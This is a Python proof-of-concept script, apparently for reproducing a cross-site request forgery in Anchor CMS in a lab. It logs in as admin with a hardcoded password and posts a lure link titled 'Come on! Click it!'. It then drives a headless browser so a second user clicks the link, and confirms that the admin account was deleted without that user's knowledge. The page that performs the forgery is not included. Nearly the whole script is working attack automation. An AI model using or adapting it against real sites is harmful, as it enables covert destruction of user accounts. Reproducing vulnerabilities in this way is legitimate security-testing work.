import requests
import re
import sys
import json
import time
from selenium import webdriver

#目的：攻击者（用admin代替）发出带有恶意第三方链接的blog + dxy用户点击
#效果：dxy用户点击后 admin账号没了

#url="http://192.168.56.100"
url="http://anchor_cms"
requests.adapters.DEFAULT_RETRIES = 5
s = requests.Session()  
s.keep_alive = False  

def admin_post():
    set_page = s.get(url+'/index.php/admin/login')
    token = re.search('name="token" type="hidden" value=\"(.+?)\"', set_page.text).group(1)
    data1 = {
	    "token": token,
	    "user": "admin",
	    "pass": "123456"
    }
    r = s.post(url+'/index.php/admin/login', data1)
    
    set_page = s.get(url+'/admin/posts/add')
    token = re.search('name="token" type="hidden" value=\"(.+?)\"', set_page.text).group(1)
    data2 = {
        "token": token,
   	    "title": "Come on! Click it!",
        "markdown": "[Come on! Click it!](http://localhost/index.html)",
	    "slug": "come-on-click-it",
	    "created": "2022-04-24 09:02:29",
	    "description": "",
	    "status": "published",
	    "category": "1",
	    "css": "",
	    "js": "",
	    "autosave": "false"
    }
    r = s.post(url+'/admin/posts/add', data2)
    if r.status_code != 200:
        print("[!] account_admin post incorrect.")
        exit()
    print("[+] account_admin post successful.")
    r = s.get(url+'/admin/logout')

firefox_opt = webdriver.FirefoxOptions()
firefox_opt.add_argument("--headless")
driver = webdriver.Firefox(options=firefox_opt)

def dxy_click():
    driver.get(url+'/index.php/admin/login')
    driver.find_element_by_id("label-user").clear()
    driver.find_element_by_id("label-user").send_keys("dxy")
    driver.find_element_by_id("pass").clear()
    driver.find_element_by_id("pass").send_keys("123456")
    driver.find_element_by_xpath('/html/body/section/form/fieldset/p[3]/button').click()
    driver.get(url+'/admin/users')
    text = re.search('/admin/login', driver.current_url)
    if text != None:
        print("[!] account_dxy login incorrect.")
        exit()
    print("[+] account_dxy login successful.")
    driver.get(url+'/posts')
    driver.find_element_by_xpath('/html/body/div/section/ul/li[1]/article/div/p/a').click()
    text = re.search('/index.html', driver.current_url)
    if text == None:
        print("[!] account_dxy click url incorrect.")
        exit()
    print("[+] account_dxy click url successful.")
    driver.get(url+'/posts')
    driver.get(url+'/admin/logout')

def check_poc():
    driver.get(url+'/index.php/admin/login')
    driver.find_element_by_id("label-user").clear()
    driver.find_element_by_id("label-user").send_keys("admin")
    driver.find_element_by_id("pass").clear()
    driver.find_element_by_id("pass").send_keys("123456")
    driver.find_element_by_xpath('/html/body/section/form/fieldset/p[3]/button').click()
    driver.get(url+'/admin/users')
    text = re.search('/admin/login', driver.current_url)
    if text == None:
        print("[!] poc error! account_admin is still exist.")
        exit()
    print("[+] poc successful! account_admin has been delete unknownly.")

if __name__ == '__main__':
    admin_post()
    dxy_click()
    check_poc()
